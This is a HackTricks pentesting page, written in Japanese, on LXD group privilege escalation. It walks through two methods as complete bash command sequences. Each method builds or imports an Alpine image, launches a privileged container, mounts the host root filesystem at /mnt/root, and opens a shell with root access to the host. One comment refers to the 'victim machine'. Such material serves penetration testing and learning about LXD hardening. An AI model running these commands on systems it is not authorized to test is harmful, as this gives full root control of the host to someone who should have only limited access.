# lxd/lxc Group - Privilege escalation

{{#include ../../../banners/hacktricks-training.md}}

ホストの LXD 管理グループ（通常は _**lxd**_）に所属していると、daemon を完全に制御できるため、root への昇格経路になる可能性があります。<sup>[[1]](#references)</sup>

## インターネットを使用しない Exploiting

### Method 1

信頼できる repository から、LXD で使用する Alpine image を download できます。  
Canonical の LXD image server は daily build を公開しています：[https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/](https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/)  
最新の build から **lxd.tar.xz** と **rootfs.squashfs** の両方を取得してください（directory 名は日付です）。<sup>[[8]](#references)</sup>

または、[project instructions](https://github.com/lxc/distrobuilder) に従って、使用している machine に distrobuilder を install できます。<sup>[[4]](#references)[[5]](#references)[[6]](#references)</sup>
```bash
# Install requirements
sudo apt update
sudo apt install -y golang-go gcc debootstrap rsync gpg squashfs-tools git make build-essential libwin-hivex-perl wimtools genisoimage

# Clone repo
mkdir -p $HOME/go/src/github.com/lxc/
cd $HOME/go/src/github.com/lxc/
git clone https://github.com/lxc/distrobuilder

# Make distrobuilder
cd ./distrobuilder
make

# Prepare the creation of alpine
mkdir -p $HOME/ContainerImages/alpine/
cd $HOME/ContainerImages/alpine/
wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml

# Create the container - Beware of architecture while compiling locally.
sudo $HOME/go/bin/distrobuilder build-incus alpine.yaml -o image.release=3.18 -o image.architecture=x86_64
```
**incus.tar.xz**（Canonical image serverからダウンロードした場合は**lxd.tar.xz**）と**rootfs.squashfs**をアップロードし、イメージをインポートしてコンテナを作成します。<sup>[[2]](#references)[[3]](#references)[[5]](#references)[[8]](#references)[[9]](#references)</sup>
```bash
lxc image import lxd.tar.xz rootfs.squashfs --alias alpine

# Check the image is there
lxc image list

# Create the container
lxc init alpine privesc -c security.privileged=true

# List containers
lxc list

lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
```
> [!CAUTION]
> このエラー _**Error: No storage pool found. Please create a new storage pool**_ が表示された場合\
> **`lxd init`** を実行してデフォルトの storage pool を設定し、その後、直前のコマンド群を再度実行してください。<sup>[[2]](#references)</sup>

最後に、container を起動し、host filesystem 上で root shell を開きます。<sup>[[1]](#references)[[2]](#references)</sup>
```bash
lxc start privesc
lxc exec privesc /bin/sh
[email protected]:~# cd /mnt/root #Here is where the filesystem is mounted
```
### 方法 2

Alpine image を構築し、`security.privileged=true` フラグを指定して起動すると、container root が host root にマッピングされます。これにより、`/` をマウントすると host filesystem が container 内に公開されます。<sup>[[1]](#references)[[7]](#references)[[9]](#references)</sup>
```bash
# build a simple alpine image
git clone https://github.com/saghul/lxd-alpine-builder
cd lxd-alpine-builder
sed -i 's,yaml_path="latest-stable/releases/$apk_arch/latest-releases.yaml",yaml_path="v3.8/releases/$apk_arch/latest-releases.yaml",' build-alpine
sudo ./build-alpine -a i686

# import the image
lxc image import ./alpine*.tar.gz --alias myimage # It's important doing this from YOUR HOME directory on the victim machine, or it might fail.

# before running the image, start and configure the lxd storage pool as default
lxd init

# run the image
lxc init myimage mycontainer -c security.privileged=true

# mount the /root into the image
lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
```
## References

- [1] [LXD の security を harden する方法](https://canonical.com/lxd/docs/latest/howto/security_harden/)
- [2] [LXD containers と virtual machines](https://ubuntu.com/server/docs/how-to/virtualisation/lxd/)
- [3] [images を copy および import する方法](https://canonical.com/lxd/docs/latest/howto/images_copy/)
- [4] [distrobuilder](https://github.com/lxc/distrobuilder)
- [5] [distrobuilder で images を build する方法](https://github.com/lxc/distrobuilder/blob/main/doc/howto/build.md)
- [6] [Alpine image definition](https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml)
- [7] [lxd-alpine-builder build script](https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine)
- [8] [LXD image server](https://images.lxd.canonical.com/)
- [9] [Type: disk](https://canonical.com/lxd/docs/latest/reference/devices_disk/)
{{#include ../../../banners/hacktricks-training.md}}
